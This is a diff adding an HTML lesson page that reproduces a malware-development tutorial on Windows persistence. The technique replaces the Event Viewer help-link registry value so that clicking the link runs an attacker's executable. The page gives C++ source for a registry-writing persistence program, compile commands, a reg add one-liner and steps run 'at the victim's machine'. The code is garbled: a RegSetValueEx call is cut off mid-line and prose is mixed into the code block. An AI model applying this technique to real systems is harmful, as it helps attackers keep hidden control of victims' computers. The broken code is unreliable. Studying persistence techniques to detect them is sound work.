@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development: persistence - part 14. Event Viewer help</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #37</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development: persistence - part 14. Event Viewer help</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">link. Simple C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is the result of my own research into one of the interesting malware persistence trick: via replacing Windows Event Viewer help link. event viewer help link Windows’ Event Viewer has existed for over a decade. The Event Viewer examines a limited number of logs that Windows maintains on your computer. The logs are XMLformatted text files containing plain content.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As part of its user interface, Event Viewer provides a link to Event Log Online Help:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">When clicked, a default help Microsoft link will be opened, which is defined at the windows registry at HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you may have guessed, it would be logical to assume that the key: MicrosoftRedirectionURL value can be changed in the interests of an attacker. That’s the trick.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s look at a practical example. Firstly, as usually, create evil application, meow-meow “malware” (hack.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+evil app for windows persistence via
+event viewer help link update
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/10/09/malware-pers-14.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR
+lpCmdLine, int nCmdShow) {
+MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
+return 0;
+}
+Then, create a program for persistence (pers.cpp):
+/*
+
+pers.cpp
+windows persistence via
+replace event viewer help link
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/10/09/malware-pers-14.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+// event viewer
+const char* app =
+"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer";
+// evil app
+const char* exe =
+"file://Z:\\2022-10-09-malware-pers-14\\hack.exe";
+
+// app
+LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)app, 0 , KEY_WRITE, &amp;hkey);
+if (res == ERROR_SUCCESS) {
+// update registry key value
+// reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Event
+// Viewer" /v "MicrosoftRedirectionUrl" /t REG_SZ /d
+// "file://...\hack.exe" /f
+RegSetValueEx(hkey, (LPCSTR)"MicrosoftRedirectionUrl", 0, REG_SZ, (unsigned char*)exe, s
+RegCloseKey(hkey);
+}
+return 0;
+}
+
+As you can see, the logic is simple, just update registry key value to file://Z:\\2022-10-09-malware-pers-14\\hack
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile “malware”: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants \ -static-libstdc++ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">check correctness:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and compile persistence script: x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants \ -static-libstdc++ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Check default registry key values at the victim’s machine - Windows 10 x64 in my case: reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">then also run at the victim’s machine - Windows 10 x64 in my case: .\pers.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Finally, try to click Event Log Online Help link again:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then I looked at the properties of hack.exe in Process Hacker 2:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This means that when link clicked, mmc.exe is launched, which in turn launches malicious behavior. For revert, after end of experiments, run: reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v "MicrosoftRedirectionUrl" /t REG_SZ /d "http://go.microsoft.com/fwlink/events.asp" /f</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">or just restore virtual machine. This is admin-level malware persistence trick, so this feature is work only with admin permissions I don’t know if any APT in the wild used this tactic and trick, but, I hope this post spreads awareness to the blue teamers of this interesting technique especially when create software, and adds a weapon to the red teamers arsenal. Event Viewer RegOpenKeyEx RegSetValueEx RegCloseKey reg query source code in github</p></main></body></html>
